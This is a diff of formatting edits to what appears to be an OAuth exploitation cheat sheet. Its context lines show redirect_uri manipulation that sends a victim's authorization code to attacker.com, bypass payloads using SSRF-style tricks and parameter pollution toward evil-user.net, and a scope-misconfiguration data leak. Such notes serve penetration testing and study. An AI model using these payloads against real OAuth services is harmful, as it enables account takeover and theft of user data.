@@ -58,7 +58,7 @@ redirect_uri=https://attacker.com
 ```
 The code is sent to `attacker.com`.<br>
 <br>
-***Note: If this process not work, try with `ssrf defense bypass` technique and `parameter pollution`.** <br>
+**Note: If this process not work, try with `ssrf defense bypass` technique and `parameter pollution`.** <br>
 <br>
 **SSRF** : `redirect_uri=https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`<br>
 **Parameter Pollution** : `client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
@@ -111,7 +111,7 @@ client_id=12345
 
 **Note: For this we need our own malicious application**
 
-In some scenario we can leak user information from Oauth authorization server by exploiting a misconfigured `scope` parameter during server-to-server token exchange.<br>
+In some scenario we can leak user information from `Oauth authorization server` by exploiting a misconfigured `scope` parameter during server-to-server token exchange.<br>
 <br>
 **Initial Authorization Request**
 ```
